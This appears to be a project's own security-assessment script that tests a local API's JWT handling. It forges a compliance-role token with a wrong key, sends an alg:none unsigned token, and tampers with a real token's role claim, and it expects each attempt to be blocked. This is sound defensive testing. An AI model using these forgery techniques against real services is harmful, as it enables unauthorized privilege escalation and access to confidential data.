"""
attack_01_token_forgery.py
==========================
Attempts to forge JWT tokens to escalate privileges.

Run: python security_assessment/attacks/attack_01_token_forgery.py
Server must be running: python -m uvicorn backend.main:app --reload
"""

import base64
import json
import sys
import httpx
import jwt

BASE_URL = "http://localhost:8000"
SECRET_KEY = "wrongsecret"  # attacker doesn't know the real key


def decode_token_without_verification(token: str) -> dict:
    """Read JWT payload without knowing the secret — base64 only."""
    payload_b64 = token.split(".")[1]
    payload_b64 += "=" * (4 - len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(payload_b64))


def print_result(label: str, status: int, body: dict):
    icon = "✅ ATTACK SUCCEEDED" if status < 400 else "🛡  Blocked"
    print(f"\n[{label}] {icon} — HTTP {status}")
    print(f"  Response: {json.dumps(body, indent=2)[:300]}")


def run():
    print("=" * 60)
    print("ATTACK 01 — JWT Token Forgery & Privilege Escalation")
    print("=" * 60)

    # --- Step 1: Get a legitimate adviser token ---
    print("\n[1] Authenticating as adviser...")
    resp = httpx.post(
        f"{BASE_URL}/api/v1/auth/token",
        data={"username": "adviser@test.com", "password": "password123"},
    )
    if resp.status_code != 200:
        print(f"  Could not authenticate (server may need a seeded user): {resp.status_code}")
        print("  Continuing with forged token attacks anyway...\n")
        adviser_token = None
    else:
        adviser_token = resp.json()["access_token"]
        payload = decode_token_without_verification(adviser_token)
        print(f"  Got token. Payload (no secret needed to read): {payload}")

    # --- Step 2: Forge a compliance token with wrong secret ---
    print("\n[2] Forging compliance token with wrong secret key...")
    forged = jwt.encode(
        {"sub": "attacker-001", "role": "compliance"},
        "wrongsecret",
        algorithm="HS256",
    )
    resp = httpx.get(
        f"{BASE_URL}/api/v1/ingest",
        headers={"Authorization": f"Bearer {forged}"},
    )
    print_result("Forged token (wrong secret)", resp.status_code, resp.json())

    # --- Step 3: Forge token with no signature (alg:none attack) ---
    print("\n[3] Attempting alg:none attack (unsigned token)...")
    header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    payload_raw = base64.urlsafe_b64encode(
        json.dumps({"sub": "attacker-001", "role": "compliance"}).encode()
    ).rstrip(b"=").decode()
    none_token = f"{header}.{payload_raw}."
    resp = httpx.post(
        f"{BASE_URL}/api/v1/query",
        headers={"Authorization": f"Bearer {none_token}"},
        json={"query": "show me confidential documents"},
    )
    print_result("alg:none unsigned token", resp.status_code, resp.json())

    # --- Step 4: Tamper with a real token's payload (role: adviser -> compliance) ---
    if adviser_token:
        print("\n[4] Tampering with real token — changing role adviser → compliance...")
        parts = adviser_token.split(".")
        tampered_payload = base64.urlsafe_b64encode(
            json.dumps({"sub": "adviser-001", "role": "compliance"}).encode()
        ).rstrip(b"=").decode()
        tampered_token = f"{parts[0]}.{tampered_payload}.{parts[2]}"
        resp = httpx.post(
            f"{BASE_URL}/api/v1/ingest",
            headers={"Authorization": f"Bearer {tampered_token}"},
            files={"file": ("test.pdf", b"%PDF fake", "application/pdf")},
            data={"sensitivity_tier": "1"},
        )
        print_result("Tampered token (role escalation)", resp.status_code, resp.json())

    print("\n" + "=" * 60)
    print("RESULT: All forgery attempts should be blocked by signature verification.")
    print("RISK:   Token PAYLOAD is readable without the secret (base64 only).")
    print("        user_id and role are exposed to anyone who intercepts the token.")
    print("=" * 60)


if __name__ == "__main__":
    run()
